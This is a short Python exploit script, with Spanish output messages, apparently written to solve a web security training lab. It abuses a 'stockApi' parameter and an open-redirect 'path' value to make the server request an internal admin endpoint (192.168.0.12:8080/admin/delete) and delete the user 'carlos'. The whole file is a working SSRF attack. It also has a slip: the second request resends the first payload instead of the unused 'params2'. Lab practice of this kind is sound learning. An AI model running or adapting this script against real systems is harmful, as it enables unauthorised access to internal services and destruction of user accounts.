import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies_setting = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def main():
    if len(sys.argv) !=2:
        print(f"(+) Uso: {sys.argv[0]} www.ejemplo.com")
        exit(-1)
    
    base_url = sys.argv[1]
    print("(+) Eliminando usuario...")
    delete_user(base_url)

def delete_user(base_url):
    url_stock = f"{base_url}/product/stock"
    payload = "/product/nextProduct?currentProductId=7&path=http://192.168.0.12:8080/admin/delete?username=carlos"
    params = {'stockApi': payload}
    response = requests.post(url_stock,data=params,verify=False,proxies=proxies_setting)
    
    
    panel_admin = "/product/nextProduct?currentProductId=7&path=http://192.168.0.12:8080/admin"
    params2 = {'stockApi': panel_admin}
    response = requests.post(url_stock,data=params,verify=False,proxies=proxies_setting)
    if "successfully" in response.text:
        print("(+) Usuraio eliminado")
    else:
        print("(-) El usurio no fue eliminado")
    

if __name__ == "__main__":
    main()